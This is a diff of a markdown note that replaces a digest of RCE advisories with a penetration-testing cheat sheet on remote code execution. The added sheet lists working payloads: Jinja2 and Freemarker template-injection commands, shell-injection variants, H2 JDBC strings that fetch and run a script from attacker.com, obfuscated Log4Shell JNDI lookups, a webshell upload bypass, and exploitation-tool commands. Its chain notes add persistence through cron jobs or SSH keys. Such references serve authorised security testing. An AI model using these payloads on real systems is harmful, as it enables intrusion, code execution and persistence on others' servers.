@@ -1,79 +1,96 @@
-# rce-techniques
+# RCE Techniques
 
+> Remote Code Execution — achieving arbitrary command execution on a target system through web application vulnerabilities.
 
-## 2026-04-16
+## Surface
 
-### Advisory: ShareFile Pre-Auth RCE — `CVE-2023-24489`
-- **Tags:** `#rce` `#deserialization` `#citrix`
-- **Severity:** critical · **Hunt:** 4/5 · **Score:** 54.0 · **Status:** poc · **Age:** 0d
-- **Sources:** [1](https://www.assetnote.io/resources/research/advisory-sharefile-pre-auth-rce-cve-2023-24489) · [2](https://www.assetnote.io/resources/research/encrypted-doesnt-mean-authenticated-sharefile-rce-cve-2023-24489)
+- File upload endpoints — SVG, PHAR, JSP, ASPX, polyglot uploads
+- Template engines — SSTI in Jinja2, Twig, Freemarker, Velocity, Pebble
+- JDBC/database connection string injection — H2 `INIT=`, PostgreSQL COPY
+- XML deserialization — .NET `XmlSerializer`, Java `XMLDecoder`, PHP `unserialize`
+- SSRF to internal services — pivot to metadata API, Redis, Memcached, Gopher
+- Command injection in shell-invoking functions — `exec`, `system`, `popen`, `Runtime.exec`
+- Log4Shell-style JNDI injection in logged user-controlled fields
+- Insecure eval/code execution in node.js/Ruby/Python — `eval(params[:code])`
 
-- **Vulnerable Entry Point**: The `UploadClientModule.asmx` endpoint processes unauthenticated SOAP requests without sufficient validation.
-- **Root Cause**: The application utilizes unsafe .NET XML deserialization, parsing user-supplied XML directly into objects.
-- **Exploitation Method**: Attackers can inject .NET gadget chains (e.g., `ObjectDataProvider`) within the XML payload to trigger arbitrary command execution.
-- **Impact Scope**: Because the flaw is pre-authentication, it allows for immediate, unauthenticated RCE on the underlying ShareFile server.
-- **Takeaway**: When auditing .NET applications, map out all endpoints accepting XML content and test for unsafe deserialization, not just XXE.
-- **Takeaway**: Legacy file management modules often run with high privileges; prioritize auditing synchronization and upload handlers for logical flaws.
+## Test Approach
 
----
-*Clustered 2 sources for this item.*
+1. **SSTI detection** — inject math expressions that differ between reflection and eval:
+   ```
+   {{7*7}}  → 49 = SSTI
+   ${7*7}   → 49 = EL/Freemarker
+   <%= 7*7 %> → 49 = ERB
+   ```
+2. **SSTI escalation** (Jinja2):
+   ```
+   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+   ```
+3. **File upload — PHAR/JSP**:
+   - Rename `.php` to `.php5`, `.phtml`, `.php%00.jpg`
+   - Upload SVG with `<script>` or SSRF-triggering XXE
+   - Try PHAR deserialization: `phar://upload/file.jpg/exploit`
+4. **JDBC H2 injection** — probe unauthenticated setup/validation endpoints:
+   ```
+   {"db": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/rce.sql'"}
+   ```
+5. **Command injection** — probe shell-adjacent params:
+   ```
+   ?host=127.0.0.1;id
+   ?filename=test$(id).txt
+   ?cmd=127.0.0.1`id`
+   ```
+6. **SSRF → internal RCE pivot** — use gopher:// to hit Redis `SLAVEOF`, or Memcached `set` for deserialization
+7. **Log4Shell** — probe all headers and params:
+   ```
+   ${jndi:ldap://collab.attacker.com/a}
+   X-Api-Version: ${jndi:ldap://...}
+   ```
 
-### Drag and Pwnd: Leverage ASCII characters to exploit VS Code
-- **Tags:** `#rce` `#command-injection` `#data-exfil`
-- **Severity:** high · **Hunt:** 4/5 · **Score:** 42.0 · **Status:** poc · **Age:** 0d
-- **Sources:** [1](https://portswigger.net/research/drag-and-pwnd-leverage-ascii-characters-to-exploit-vs-code)
+## Tools
 
-- Legacy ASCII control characters (SOH, STX, EOT, ETX) are often overlooked by modern sanitization but can still trigger commands in terminal emulators.
-- VS Code's integrated terminal can be manipulated into executing commands based on the content of files being dragged or processed.
-- The attack vector leverages the gap between the editor's UI handling and the terminal's interpretation of control sequences.
-- This method bypasses standard input validation that focuses on printable characters, making it a stealthy injection technique.
+- **nuclei** — SSTI, Log4Shell, RCE templates: `nuclei -t rce/ -u https://target.com`
+- **tplmap** — automated SSTI exploitation: `python3 tplmap.py -u "https://target.com/render?name=*"`
+- **Interactsh** — OOB callback server for blind RCE: `interactsh-client`
+- **ysoserial** — Java deserialization gadget chains: `java -jar ysoserial.jar CommonsCollections6 'id'`
+- **commix** — command injection automation: `commix --url="https://target.com/ping?host=*"`
 
-**Practical Takeaways:**
-- Audit file handling code to strip or escape non-printable control characters before passing data to shells or terminals.
-- Test integrated development environments (IDEs) for command injection by embedding control sequences in filenames and file content.
+## Payloads / Probes
 
----
-### MOVEit Transfer RCE Part Two (CVE-2023-34362) — `CVE-2023-34362`
-- **Tags:** `#rce` `#api` `#enterprise`
-- **Severity:** critical · **Hunt:** 4/5 · **Score:** 27.0 · **Status:** poc · **Age:** 127d
-- **Sources:** [1](https://www.assetnote.io/resources/research/moveit-transfer-rce-part-two-cve-2023-34362)
+```
+# SSTI - Jinja2 RCE
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 
-- Insight: Variant of CVE-2023-34362 with distinct RCE mechanism in MOVEit Transfer's file processing pipeline
-- Insight: Exploitable via crafted file transfers triggering deserialization of untrusted input
-- Insight: Affects version-specific endpoints handling large file payloads and metadata
-- Insight: Allows authenticated user privilege escalation to SYSTEM-level compromise
-- Insight: Demonstrates recurring flaw in MOVEit's input validation design patterns
+# SSTI - Freemarker
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
 
-Practical takeaways:
-- Test file transfer endpoints with malicious payloads and metadata variations during pentests
-- Prioritize MOVEit instances for patching; monitor for unusual file transfer activities as IOCs
+# Command injection variants
+; id
+$(id)
+`id`
+| id
+%0aid
 
----
-### Bypass IIS Auth in Sitecore 9.3 - Three RCEs and Auth Bypasses
-- **Tags:** `#rce` `#auth-bypass` `#iis` `#sitecore`
-- **Severity:** critical · **Hunt:** 3/5 · **Score:** 26.55 · **Status:** theoretical · **Age:** 1d
-- **Sources:** [1](https://www.assetnote.io/resources/research/bypass-iis-authorisation-with-this-one-weird-trick-three-rces-and-two-auth-bypasses-in-sitecore-9-3)
+# H2 JDBC RCE
+jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/cmd.sql'
 
-- **Insight 1:** The research demonstrates novel techniques to bypass IIS authorization mechanisms specifically in Sitecore 9.3, leveraging how the application handles authentication at the web server level.
-- **Insight 2:** Multiple vulnerability vectors exist, including three distinct paths achieving Remote Code Execution, potentially through crafted requests that manipulate Sitecore's interaction with IIS security modules.
-- **Insight 3:** Two authentication bypass methods allow attackers to access sensitive functionality without proper authentication, potentially compromising entire Sitecore environments.
+# Log4Shell
+${jndi:ldap://attacker.interactsh.com/a}
+${${lower:j}ndi:${lower:l}dap://attacker.com/a}
 
-**Takeaways:**
-- Organizations running Sitecore 9.3 should immediately audit their IIS configuration and test for these specific authorization bypass techniques, especially if the application is exposed to the internet.
-- Consider implementing additional authentication layers beyond IIS for critical Sitecore components, as the product's integration with IIS security creates unique attack surfaces not present in other web applications.
+# PHP file upload - null byte bypass
+filename="shell.php%00.jpg"
+```
 
----
-### Chaining Pre-Auth RCE in Metabase (CVE-2023-38646) — `CVE-2023-38646`
-- **Tags:** `#rce` `#deserialization` `#command-injection` `#web`
-- **Severity:** critical · **Hunt:** 2/5 · **Score:** 18.0 · **Status:** patched · **Age:** 0d
-- **Sources:** [1](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646) · [2](https://www.assetnote.io/resources/research/advisory-metabase-pre-auth-rce-cve-2023-38646)
+## Chain Opportunities
 
-- **Insight 1:** The vulnerability leverages the H2 database connection string's `INIT` parameter to execute arbitrary SQL commands during the connection validation phase on the `/api/setup/validate` endpoint.
-- **Insight 2:** Attackers can abuse H2's `ALIAS` function to create custom functions that invoke arbitrary Java methods, effectively bridging the gap from SQL injection to native code execution.
-- **Insight 3:** The issue stems from a lack of strict validation on JDBC connection strings in pre-authentication endpoints, allowing the database driver's feature set to be weaponized.
-- **Insight 4:** Successful exploitation requires no prior authentication and works reliably on the default H2 in-memory database configurations often used during setup or testing.
-- **Takeaway:** When auditing Java applications, pay close attention to unauthenticated endpoints that accept database connection details, specifically looking for dangerous JDBC parameters like `INIT`.
-- **Takeaway:** Block or strictly sanitize JDBC URL schemes in user input, as database drivers often contain features (like script execution or classloading) that can lead to RCE.
+- **SSRF → RCE** — SSRF reaches internal Jenkins/Solr/Redis, pivot to code execution
+- **SSTI → RCE → persistence** — write cron job or SSH key via template engine
+- **File upload → RCE** — bypass extension filter, execute webshell
+- **JDBC injection → RCE** — H2/PostgreSQL INIT scripts execute OS commands
+- **Deserialization → RCE** — Java/PHP gadget chains in XML, session cookies, API params
 
----
-*Clustered 2 sources for this item.*
+## Recent Intel
+
+- **CVE-2023-24489** · Citrix ShareFile pre-auth RCE via `UploadClientModule.asmx` — unsafe .NET XML deserialization, `ObjectDataProvider` gadget chain · https://www.assetnote.io/resources/research/advisory-sharefile-pre-auth-rce-cve-2023-24489
+- **CVE-2023-34362** · MOVEit Transfer RCE — deserialization in file processing pipeline, SYSTEM-level compromise via crafted file transfer · https://www.assetnote.io/resources/research/moveit-transfer-rce-part-two-cve-2023-34362
+- **CVE-2023-38646** · Metabase pre-auth RCE — H2 JDBC `INIT` param via `/api/setup/validate`, SQL → Java method invocation chain · https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646
